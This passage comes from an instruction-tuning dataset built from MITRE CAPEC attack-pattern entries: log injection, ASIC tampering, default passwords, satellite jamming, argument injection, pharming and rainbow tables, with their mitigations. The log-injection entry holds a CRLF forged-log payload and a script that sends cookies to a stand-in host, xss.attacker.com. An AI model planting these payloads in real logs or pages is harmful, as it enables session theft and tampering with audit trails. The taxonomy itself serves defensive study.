                "Determine logging utility being used by application (e.g. log4j)",
                "Gain access to application's source code to determine log file formats.",
                "Install or obtain access to instance of application and observe its log file format."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.",
              "Technique": [
                {
                  "xhtml:p": [
                    "Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example:",
                    "may add the following forged entry into a log file:",
                    "Different applications may require different encodings of the carriage return and line feed characters."
                  ],
                  "xhtml:div": [
                    {
                      "@style": "margin-left:1em;",
                      "@class": "attack",
                      "#text": "\"%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in\""
                    },
                    {
                      "@style": "margin-left:1em;",
                      "@class": "result",
                      "#text": "\"[Thu Nov 12 12:11:22]:Info: User admin logged in\""
                    }
                  ]
                },
                {
                  "xhtml:p": [
                    "Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain",
                    "The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page)."
                  ],
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "@class": "attack",
                    "#text": "<script>new Image().src=\"http://xss.attacker.com/log_cookie?cookie=\"+encodeURI(document.cookie);</script>"
                  }
                }
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target host is logging the action and data of the user.",
            "The target host insufficiently protects access to the logs or logging mechanisms."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "This attack can be as simple as adding extra characters to the logged data (e.g. username). Adding entries is typically easier than removing entries."
            },
            {
              "@Level": "Medium",
              "#text": "A more sophisticated attack can try to defeat the input validation mechanism."
            }
          ]
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Modify Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Carefully control access to physical log files.",
            "Do not allow tainted data to be written in the log file without prior input validation. An allowlist may be used to properly validate the data.",
            "Use synchronization to control the flow of execution.",
            "Use static analysis tools to identify log forging vulnerabilities.",
            "Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Dave Nielsen and Patrick Breitenbach PayPal Web Services (aka PHP Toolkit) 0.50, and possibly earlier versions, allows remote attackers to enter false payment entries into the log file via HTTP POST requests to ipn_success.php. See also: CVE-2006-0201",
            {
              "xhtml:p": [
                "If a user submits the string \"twenty-one\" for val, the following entry is logged:",
                "However, if an attacker submits the string",
                "the following entry is logged:",
                "Clearly, attackers can use this same mechanism to insert arbitrary log entries."
              ],
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "result",
                  "#text": "INFO: Failed to parse val=twenty-one"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "attack",
                  "#text": "twenty-one%0a%0aINFO:+User+logged+out%3dbadguy"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "result",
                  "xhtml:br": null,
                  "#text": "INFO: Failed to parse val=twenty-oneINFO: User logged out=badguy"
                }
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "117"
            },
            {
              "@CWE_ID": "75"
            },
            {
              "@CWE_ID": "150"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-131"
            },
            {
              "@External_Reference_ID": "REF-550"
            },
            {
              "@External_Reference_ID": "REF-551",
              "@Section": "Log injection"
            },
            {
              "@External_Reference_ID": "REF-552",
              "@Section": "Test Case ID 1579"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Examples-Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Mitigations, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - ASIC With Malicious Functionality (CAPEC ID: 539)",
    "context": "",
    "output": "A hardware manufacturer periodically updates its ASIC with new features. The attacker, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for ASIC design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent ASIC development system. The attacker is then able to exfiltrate and alter sensitive data on the ASIC system, allowing for future compromise once a new AISC is deployed at the victim location.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A hardware manufacturer periodically updates its ASIC with new features. The attacker, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for ASIC design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent ASIC development system. The attacker is then able to exfiltrate and alter sensitive data on the ASIC system, allowing for future compromise once a new AISC is deployed at the victim location.",
      "@Name": "ASIC With Malicious Functionality (CAPEC ID: 539)",
      "attack_ptrn": {
        "@ID": "539",
        "@Name": "ASIC With Malicious Functionality",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker with access to the development environment process of an application-specific integrated circuit (ASIC) for a victim system being developed or maintained after initial deployment can insert malicious functionality into the system for the purpose of disruption or further compromise.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": {
              "@Exclude_ID": "513"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The attacker must have working knowledge of some if not all of the components involved in the target system as well as the infrastructure and development environment of the manufacturer.",
            "Advanced knowledge about the ASIC installed within the target system."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Able to develop and manufacture malicious subroutines for an ASIC environment without degradation of existing functions and processes."
          }
        },
        "Example_Instances": {
          "Example": "A hardware manufacturer periodically updates its ASIC with new features. The attacker, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for ASIC design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent ASIC development system. The attacker is then able to exfiltrate and alter sensitive data on the ASIC system, allowing for future compromise once a new AISC is deployed at the victim location."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-439"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Try Common or Default Usernames and Passwords (CAPEC ID: 70)",
    "context": "",
    "output": "A user sets their password to \"123\" or intentionally leaves their password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.\nCisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username \"root\" with a password \"password\". This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288\nIn April 2019, adversaries attacked several popular IoT devices (a VOIP phone, an office printer, and a video decoder) across multiple customer locations. An investigation conducted by the Microsoft Security Resposne Center (MSRC) discovered that these devices were used to gain initial access to corporate networks. In two of the cases, the passwords for the devices were deployed without changing the default manufacturer\u2019s passwords and in the third instance the latest security update had not been applied to the device. [REF-572]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A user sets their password to \"123\" or intentionally leaves their password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.",
        "Cisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username \"root\" with a password \"password\". This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288",
        "In April 2019, adversaries attacked several popular IoT devices (a VOIP phone, an office printer, and a video decoder) across multiple customer locations. An investigation conducted by the Microsoft Security Resposne Center (MSRC) discovered that these devices were used to gain initial access to corporate networks. In two of the cases, the passwords for the devices were deployed without changing the default manufacturer\u2019s passwords and in the third instance the latest security update had not been applied to the device. [REF-572]"
      ],
      "@Name": "Try Common or Default Usernames and Passwords (CAPEC ID: 70)",
      "attack_ptrn": {
        "@ID": "70",
        "@Name": "Try Common or Default Usernames and Passwords",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. \"secret\" or \"password\") that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "49"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The system uses one factor password based authentication.The adversary has the means to interact with the system."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally, a brute force attack leveraging common passwords can be easily realized if the user name is known."
          }
        },
        "Resources_Required": {
          "Resource": "Technology or vendor specific list of default usernames and passwords."
        },
        "Indicators": {
          "Indicator": "Many incorrect login attempts are detected by the system."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Delete all default account credentials that may be put in by the product vendor.",
            "Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.",
            "Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.",
            "Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen."
          ]
        },
        "Example_Instances": {
          "Example": [
            "A user sets their password to \"123\" or intentionally leaves their password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.",
            "Cisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username \"root\" with a password \"password\". This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288",
            "In April 2019, adversaries attacked several popular IoT devices (a VOIP phone, an office printer, and a video decoder) across multiple customer locations. An investigation conducted by the Microsoft Security Resposne Center (MSRC) discovered that these devices were used to gain initial access to corporate networks. In two of the cases, the passwords for the devices were deployed without changing the default manufacturer\u2019s passwords and in the third instance the latest security update had not been applied to the device. [REF-572]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "798"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1078.001",
            "Entry_Name": "Valid Accounts:Default Accounts"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-572"
            },
            {
              "@External_Reference_ID": "REF-574"
            },
            {
              "@External_Reference_ID": "REF-596",
              "@Section": "Testing for Account Enumeration and Guessable User Account"
            },
            {
              "@External_Reference_ID": "REF-597",
              "@Section": "Testing for Default Credentials"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, References, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Try Common(default) Usernames and Passwords"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Terrestrial Jamming (CAPEC ID: 599)",
    "context": "",
    "output": "Possible examples: An attempt to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These jamming signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attempt to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These jamming signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.",
      "@Name": "Terrestrial Jamming (CAPEC ID: 599)",
      "attack_ptrn": {
        "@ID": "599",
        "@Name": "Terrestrial Jamming",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In this attack pattern, the adversary transmits disruptive signals in the direction of the target's consumer-level satellite dish (as opposed to the satellite itself). The transmission disruption occurs in a more targeted range. Portable terrestrial jammers have a range of 3-5 kilometers in urban areas and 20 kilometers in rural areas. This technique requires a terrestrial jammer that is more powerful than the frequencies sent from the satellite.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "195",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "403"
              }
            ]
          }
        },
        "Resources_Required": {
          "Resource": {
            "xhtml:p": [
              "A terrestrial satellite jammer with a signal more powerful than that of the satellite attempting to communicate with the target.",
              "The adversary must know the location of the target satellite dish."
            ]
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Other",
            "Note": "A successful attack will deny, degrade, or disrupt availability of satellite communications for the target by overwhelming its resources to accurately receive authorized transmissions."
          }
        },
        "Example_Instances": {
          "Example": "An attempt to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These jamming signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary."
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-462"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Seamus Tuohy",
            "Submission_Date": "2017-01-12"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Description, Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Argument Injection (CAPEC ID: 6), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [REF-482]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [REF-482]",
      "@Name": "Argument Injection (CAPEC ID: 6)",
      "attack_ptrn": {
        "@ID": "6",
        "@Name": "Argument Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "137",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Discovery of potential injection vectors] Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).",
              "Technique": [
                "Manually cover the application and record the possible places where arguments could be passed into external systems.",
                "Use a spider, for web applications, to create a list of URLs and associated inputs."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[1. Attempt variations on argument content] Possibly using an automated tool, the attacker will perform injection variations of the arguments.",
              "Technique": [
                "Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).",
                "Use a proxy tool to record results, error messages and/or log if accessible."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Abuse of the application] The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.",
              "Technique": "Manually inject specific payload into targeted argument."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.",
            "Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker has to identify injection vector, identify the operating system-specific commands, and optionally collect the output."
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.",
            "Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.",
            "Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise."
          ]
        },
        "Example_Instances": {
          "Example": "A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [REF-482]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "146"
            },
            {
              "@CWE_ID": "184"
            },
            {
              "@CWE_ID": "78"
            },
            {
              "@CWE_ID": "185"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-482"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Pharming (CAPEC ID: 89), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An online bank website requires users to provide their customer ID and password to log on, but does not use a secure connection.\n- An attacker can setup a similar fake site and leverage pharming to collect this information from unknowing victims.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An online bank website requires users to provide their customer ID and password to log on, but does not use a secure connection.",
        "An attacker can setup a similar fake site and leverage pharming to collect this information from unknowing victims."
      ],
      "@Name": "Pharming (CAPEC ID: 89)",
      "attack_ptrn": {
        "@ID": "89",
        "@Name": "Pharming",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to their site rather than the originally intended one. Pharming does not require script injection or clicking on malicious links for the attack to succeed.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "151",
            "Exclude_Related": [
              {
                "@Exclude_ID": "515"
              },
              {
                "@Exclude_ID": "512"
              },
              {
                "@Exclude_ID": "513"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original website"
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "When the victim requests the URL for the site, the poisoned records direct the victim to the attackers' system rather than the original one."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now \"farm\" sensitive information such as credentials or account numbers."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Vulnerable DNS software or improperly protected hosts file or router that can be poisoned",
            "A website that handles sensitive information but does not use a secure connection and a certificate that is valid is also prone to pharming"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to be able to poison the resolver - DNS entries or local hosts file or router entry pointing to a trusted DNS server - in order to successfully carry out a pharming attack. Setting up a fake website, identical to the targeted one, does not require special skills."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack. Having knowledge of the way the target site has been structured, in order to create a fake version, is required. Poisoning the resolver requires knowledge of a vulnerability that can be exploited."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "All sensitive information must be handled over a secure connection.",
            "Known vulnerabilities in DNS or router software or in operating systems must be patched as soon as a fix has been released and tested.",
            "End users must ensure that they provide sensitive information only to websites that they trust, over a secure connection with a valid certificate issued by a well-known certificate authority."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An online bank website requires users to provide their customer ID and password to log on, but does not use a secure connection.",
              "An attacker can setup a similar fake site and leverage pharming to collect this information from unknowing victims."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "350"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Rainbow Table Password Cracking (CAPEC ID: 55)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Rainbow Table Password Cracking (CAPEC ID: 55) are: BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058",
      "@Name": "Rainbow Table Password Cracking (CAPEC ID: 55)",
      "attack_ptrn": {
        "@ID": "55",
        "@Name": "Rainbow Table Password Cracking",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker gets access to the database table where hashes of passwords are stored. They then use a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.",
        "Extended_Description": {
